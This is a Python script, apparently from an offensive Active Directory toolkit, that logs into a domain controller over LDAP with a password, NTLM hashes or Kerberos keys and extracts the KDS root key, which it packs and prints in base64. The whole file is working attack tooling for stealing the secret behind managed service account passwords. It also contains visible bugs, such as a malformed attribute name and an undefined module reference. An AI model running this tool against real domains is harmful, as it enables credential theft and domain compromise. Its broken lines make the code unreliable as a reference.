import argparse
import base64
from binascii import hexlify
import logging
import struct
import sys
import uuid

from impacket.examples.utils import parse_credentials
from impacket.ldap import ldap, ldapasn1

from blastfurnace.lib.dpapi import KeyCache

class GetKDSRoot:
    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__target = None
        self.__lmhash = ""
        self.__nthash = ""
        self.__aesKey = cmdLineOptions.aeskey
        self.__doKerberos = cmdLineOptions.k
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(":")

        # create the baseDN
        domainParts = self.__domain.split(".")
        self.baseDN = "CN=Configuration,"
        for i in domainParts:
            self.baseDN += f"DC={i},"
        # remove trailing comma
        self.baseDN = self.baseDN[:-1]

        # create empty KeyCache
        self.cache = KeyCache()

    def processRecord(self, item):
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return
        self.cn = ""
        self.ProbReserved = 0
        self.ProbReserved2 = 0
        self.ProbReserved3 = 0
        self.ProbReserved4 = 0
        self.ProbReserved5 = 0
        self.ProbReserved6 = 0
        self.ProbReserved7 = 0
        self.flag = 1
        self.flag2 = 1
        self.msKds_Version = 1
        self.msKds_Version2 = 1
        self.msKds_KDFAlgorithmID = ""
        self.msKds_KDFParam = b""
        self.msKds_SecretAgreementAlgorithmID = ""
        self.msKds_SecretAgreementParam = b""
        self.msKds_PrivateKeyLength = 0
        self.msKds_PublicKeyLength = 0
        self.msKds_DomainID = ""
        self.msKds_CreateTime = 0
        self.msKds_UseStartTime = 0
        self.msKds_RootKeyData = b""
        self.msKds_RootKeyDataSize = 64

        try:
            for attribute in item['attributes']:
                #print(f"Checking against attribute type: {str(attribute['type'])}")
                #print(f"Checking against attribute val: {attribute['vals'][0].asOctets().decode('utf-8')}")
                if str(attribute['type']) == 'cn':
                    cn = attribute['vals'][0].asOctets().decode('utf-8')
                    self.root_id = cn
                    cnArr = cn.split('-')
                    self.cn = bytearray.fromhex(cnArr[0])[::-1]
                    self.cn = self.cn + bytearray.fromhex(cnArr[1])[::-1]
                    self.cn = self.cn + bytearray.fromhex(cnArr[2])[::-1]
                    self.cn = self.cn + bytearray.fromhex(cnArr[3])
                    self.cn = self.cn + bytearray.fromhex(cnArr[4])
                    logging.debug(f"cn={hexlify(self.cn).decode()}")
                    logging.debug(f"rootID={self.root_id}")
                elif str(attribute['type']) == "msKds-Version":
                    self.msKds_Version = int(attribute['vals'][0])
                    self.msKds_Version2 = self.msKds_Version
                    logging.debug(f"msKds-Version={self.msKds_Version}")
                    logging.debug(f"msKds-Version2={self.msKds_Version2}")
                elif str(attribute['type']) == "msKds-KDFAlgorithmID":
                    self.msKds_KDFAlgorithmID = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.debug(f"msKds-KDFAlogrithmID={self.msKds_KDFAlgorithmID}")
                elif str(attribute['type']) == "msKds-KDFParam":
                    self.msKds_KDFParam = attribute['vals'][0].asOctets()
                    logging.debug(f"msKds-KDFParam={hexlify(self.msKds_KDFParam).decode()}")
                elif str(attribute['type']) == "msKds-SecretAgreementAlgorithmID":
                    self.msKds_SecretAgreementAlgorithmID = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.debug(f"msKds-SecretAgreementAlgorithmID={self.msKds_SecretAgreementAlgorithmID}")
                elif str(attribute['type']) == "msKds-SecretAgreementParam":
                    self.msKds_SecretAgreementParam = attribute['vals'][0].asOctets()
                    logging.debug(f"msKds-SecretAgreementParam={hexlify(self.msKds_SecretAgreementParam).decode()}")
                elif str(attribute['type']) == "msKds-PrivateKeyLength":
                    self.msKds_PrivateKeyLength = int(attribute['vals'][0])
                    logging.debug(f"msKds-PrivateKeyLength={self.msKds_PrivateKeyLength}")
                elif str(attribute['type']) == "msKds-PublicKeyLength":
                    self.msKds_PublicKeyLength = int(attribute['vals'][0])
                    logging.debug(f"msKds-PublicKeyLength={self.msKds_PublicKeyLength}")
                elif str(attribute['type']) == "msKds-DomainID":
                    self.msKds_DomainID = attribute['vals'][0].asOctets().decode('utf-8')
                    logging.debug(f"msKds-DomainID={self.msKds_DomainID}")
                elif str(attribute['type']) == "msKds-CreateTime":
                    self.msKds_CreateTime = int(attribute['vals'][0])
                    logging.debug(f"msKds-CreateTime={self.msKds_CreateTime}")
                elif str(attribute['type']) == "msKds-UseStartTime":
                    self.msKds_UseStartTime = int(attribute['vals'][0])
                    logging.debug(f"msKds-UseStartTime={self.msKds_UseStartTime}")
                elif str(attribute['type']) == "msKds-RootKeyData":
                    self.msKds_RootKeyData = attribute['vals'][0].asOctets()
                    logging.debug(f"msKds-RootKeyData={hexlify(self.msKds_RootKeyData).decode()}")
                    self.msKds_RootKeyDataSize = len(self.msKds_RootKeyData)
                    logging.debug(f"msKds-RootKeyDataSize={self.msKds_RootKeyDataSize}")
        except Exception as e:
            logging.debug("Exception", exec_info=True)
            logging.error(f"Skipping item, cannot process due to error {e}")
            pass

        # store KDS root key in cache
        root_id = uuid.UUID(self.root_id)
        self.cache.load_key(self.msKds_RootKeyData,
                            root_id, version=1, kdf_algorithm=self.msKds_KDFAlgorithmID,
                            kdf_parameters=self.msKds_KDFParam,
                            secret_algorithm="DH",
                            secret_parameters=self.msKds_SecretAgreementParam,
                            private_key_length=512,
                            public_key_length=2048)
    def dump_root_key(self):
        rk = self.cache.dump_keys()

    def generate_root_key(self):

        kDFAlgoIDSize = len(bytes(self.msKds_KDFAlgorithmID, 'utf-16le'))
        kDFParamSize = len(self.msKds_KDFParam)
        secretAgreementParamSize = len(self.msKds_SecretAgreementParam)
        secretAgreementAlgoIDSize = len(bytes(self.msKds_SecretAgreementAlgorithmID, 'utf-16le'))
        domainIDSize = len(bytes(self.msKds_DomainID, 'utf-16le'))

        rootKeySize = 124 + kDFAlgoIDSize + kDFParamSize + secretAgreementParamSize
        rootKeySize += secretAgreementAlgoIDSize + domainIDSize + self.msKds_RootKeyDataSize

        logging.debug(f"rootKeySize={rootKeySize}")

        keypack_fmt_lens = (len(self.cn), kDFAlgoIDSize, kDFParamSize, secretAgreementAlgoIDSize,
                         secretAgreementParamSize, domainIDSize, self.msKds_RootKeyDataSize)
        keypack_fmt = "<i%ds4i%dsi%dsii%dsi%ds5iqqi%ds4q%ds" % keypack_fmt_lens

        self.rootkey = struct.pack(keypack_fmt, 
                          self.msKds_Version,
                          self.cn,
                          self.ProbReserved,
                          self.msKds_Version2,
                          self.ProbReserved2,
                          kDFAlgoIDSize,
                          bytes(self.msKds_KDFAlgorithmID, 'utf-16le'),
                          kDFParamSize,
                          self.msKds_KDFParam,
                          self.ProbReserved3,
                          secretAgreementAlgoIDSize,
                          bytes(self.msKds_SecretAgreementAlgorithmID, 'utf-16le'),
                          secretAgreementParamSize,
                          self.msKds_SecretAgreementParam,
                          self.msKds_PrivateKeyLength,
                          self.msKds_PublicKeyLength,
                          self.ProbReserved4,
                          self.ProbReserved5,
                          self.ProbReserved6,
                          self.flag,
                          self.flag2,
                          domainIDSize,
                          bytes(self.msKds_DomainID, 'utf-16le'),
                          self.msKds_CreateTime,
                          self.msKds_UseStartTime,
                          self.ProbReserved7,
                          self.msKds_RootKeyDataSize,
                          self.msKds_RootKeyData
        )
        logging.info(f"kds root key: {base64.b64encode(self.rootkey).decode()}")

    def get_gke(self):
        '''
            Generates the GKE from the KDS root key parameters
            using the DPAPI-NG library '''

        cache = dpapi_ng.KeyCache()
        root_id = uuid.UUID(self.root_id)
        cache.load_key(
                self.msKds_RootKeyData,
                root_id,
                version=1,
                kdf_algorithm=self.msKds_KDFAlgorithmID,
                kdf_parameters=self.msKds_KDFParam,
                secret_algorithm=self.msKds_SecretAgreementAlgorithmID,
                secret_parameters=self.msKds_SecretAgreementParam,
                private_key_length=self.msKds_PrivateKeyLength,
                public_key_length=self.msKds_PublicKeyLength
        )

    def run(self):
        if self.__kdcHost is not None:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__domain

        try:
            ldapConnection = ldap.LDAPConnection(f"ldap://{self.__target}", self.baseDN, self.__kdcIP)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcIP)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # try ldaps instead
                ldapConnection = ldap.LDAPConnection(f"ldaps://{self.__target}", self.baseDN, self._-kdcIP)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcIP)
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use kerberos auth instead")
                else:
                    if self.__kdcIP is not None:
                        logging.critical("If the creds are valid, check the hostname and IP address of the KDC. They must match")
            raise

        logging.debug("Connected to the LDAP server")
        logging.info(f"Querying {self.__target} for KDS Root Parameters")

        # build search filter
        searchFilter = "(&(objectClass=msKds-ProvRootKey))"

        try:
            logging.debug(f"Search filter={searchFilter}")
            sc = ldap.SimplePagedResultsControl(size=1)
            ldapConnection.search(searchFilter=searchFilter,
                                  searchControls = [sc], perRecordCallback=self.processRecord)
        except ldap.LDAPSearchError:
            raise

        ldapConnection.close()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(add_help = True, description="Retrieves KDS root key using Domain Admin credentials")

    parser.add_argument("target", action="store", help="domain[/username[:password]]")
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

    group = parser.add_argument_group("authentication")
    group.add_argument("-hashes", action="store", metavar = "LMHASH:NTHASH", help="NTLM hashes, format is LMHASH:NTHASH")
    group.add_argument("-no-pass", action="store_true", help="don't ask for password (used with -k)")
    group.add_argument("-k", action="store_true", help="Use kerberos authentication. Grabs creds from ccache file")
    group.add_argument("-aeskey", action="store", metavar= "aes", help="AES key to use for Kerberos Authentication. 128 or 256 bits")

    group = parser.add_argument_group("connection")
    group.add_argument("-dc-ip", action="store", metavar="dc_ip", help="IP Address of domain controller.")
    group.add_argument("-dc-host", action="store", metavar="dc_host", help="Hostname of domain controller.")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug("Debug mode enabled")
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.target)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aeskey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aeskey is not None:
        options.k = True

    try:
        executer = GetKDSRoot(username, password, domain, options)
        executer.run()
        #executer.generate_root_key()
        executer.dump_root_key()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
